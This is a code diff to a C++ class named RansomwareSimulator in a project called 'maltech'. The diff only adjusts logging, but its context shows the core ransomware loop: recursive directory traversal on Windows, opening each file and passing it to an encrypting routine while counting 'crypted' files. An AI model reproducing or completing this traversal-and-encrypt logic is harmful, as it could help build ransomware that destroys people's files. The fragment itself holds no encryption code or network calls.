@@ -55,6 +55,7 @@ namespace maltech {
         }
 
         void RansomwareSimulator::ProcessCatalogue(std::string_view path) {
+            LOG_DEBUG("Processing catalogue " + std::string(path));
             WIN32_FIND_DATA data{ 0 };
             HANDLE hDirEntry = FindFirstFileA(path.data(), &data);
             if (!hDirEntry || hDirEntry == INVALID_HANDLE_VALUE) {
@@ -72,7 +73,6 @@ namespace maltech {
                 }
                 std::string full_path = std::string(path.substr(0, path.size() - 1)) 
                     + data.cFileName;
-                LOG_INFO(full_path);
                 if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                     try {
                         ProcessCatalogue(
@@ -99,6 +99,7 @@ namespace maltech {
                 HANDLE hFile = OpenFile(path);
                 ProcessFileEncrypting(hFile);
                 ++crypted_count_;
+                LOG_DEBUG("[crypted] - " + std::string(path));
             }
             catch (const std::exception& e) {
                 LOG_ERROR(e.what());
